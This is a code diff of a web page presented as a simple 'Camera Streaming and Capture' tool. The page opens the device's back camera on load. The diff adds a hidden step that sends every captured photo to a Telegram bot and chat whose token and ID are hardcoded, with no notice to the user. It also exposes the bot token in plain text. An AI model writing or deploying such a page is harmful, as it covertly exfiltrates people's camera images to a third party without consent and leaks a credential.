@@ -1,43 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Streaming and Capture</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Streaming and Capture</title>
 </head>
+
 <body>
-    <h1>Camera Streaming and Capture</h1>
-    <video id="video" width="1280" height="720" muted playsinline loop autoplay></video><br>
-    <button id="captureButton">Capture Image</button><br>
-    <canvas id="canvas" width="400" height="600" style="display: none;"></canvas><br>
-    <img id="capturedImage" src="" alt="Captured Image">
+  <h1>Camera Streaming and Capture</h1>
+  <video id="video" width="1280" height="720" muted playsinline loop autoplay></video><br>
+  <button id="captureButton">Capture Image</button><br>
+  <canvas id="canvas" width="400" height="600" style="display: none;"></canvas><br>
+  <img id="capturedImage" src="" alt="Captured Image">
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('captureButton');
-        const capturedImage = document.getElementById('capturedImage');
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('captureButton');
+    const capturedImage = document.getElementById('capturedImage');
 
-        // Start video streaming from back camera
-        async function startVideo() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 1280, height: 720 } });
-                video.srcObject = stream;
-            } catch (err) {
-                console.error('Error accessing camera:', err);
-            }
-        }
+    // Start video streaming from back camera
+    async function startVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 1280, height: 720 } });
+        video.srcObject = stream;
+      } catch (err) {
+        console.error('Error accessing camera:', err);
+      }
+    }
 
-        // Capture image from video stream
-        captureButton.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageDataURL = canvas.toDataURL('image/jpeg', 1); // Adjust quality here if needed
-            capturedImage.src = imageDataURL;
+    // Capture image from video stream
+    captureButton.addEventListener('click', () => {
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageDataURL = canvas.toDataURL('image/jpeg', 1); // Adjust quality here if needed
+      capturedImage.src = imageDataURL;
+
+      // Send captured image to Telegram
+      sendPhotoToTelegram(imageDataURL);
+    });
+
+    // Function to send photo to Telegram
+    async function sendPhotoToTelegram(imageDataURL) {
+      const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
+      const chatId = '-1001971484231';
+
+
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            photo: imageDataURL
+          })
         });
 
-        // Start video streaming when the page loads
-        startVideo();
-    </script>
+        const data = await response.json();
+        console.log('Telegram API response:', data);
+      } catch (error) {
+        console.error('Error sending photo to Telegram:', error);
+      }
+    }
+
+    // Start video streaming when the page loads
+    startVideo();
+  </script>
 </body>
+
 </html>
